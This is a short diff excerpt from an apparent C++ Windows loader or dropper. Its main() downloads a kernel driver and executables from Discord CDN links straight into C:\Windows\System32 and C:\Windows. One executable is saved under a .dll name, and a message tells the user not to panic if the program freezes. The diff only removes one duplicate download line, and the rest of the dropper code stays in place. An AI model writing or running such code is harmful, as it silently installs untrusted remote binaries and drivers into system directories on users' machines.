@@ -105,7 +105,6 @@ int main()
 	URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/879371915989483533/879373137253400607/amifldrv64.sys", "C:\\Windows\\System32\\amifldrv64.sys", 0, 0);
 	URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/879371915989483533/879373368699273276/ifsutipx.exe", "C:\\Windows\\System32\\ifsutipx.exe", 0, 0);
 	URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/879371915989483533/879373584676573184/winhlp64.exe", "C:\\Windows\\winhlp64.dll", 0, 0);
-	URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/879371915989483533/879373584676573184/winhlp64.exe", "C:\\Windows\\winhlp64.dll", 0, 0);
 
 	std::cout << "\n [#] Doing the job, Don't Panic if it freeze here";
 	Sleep(1500);
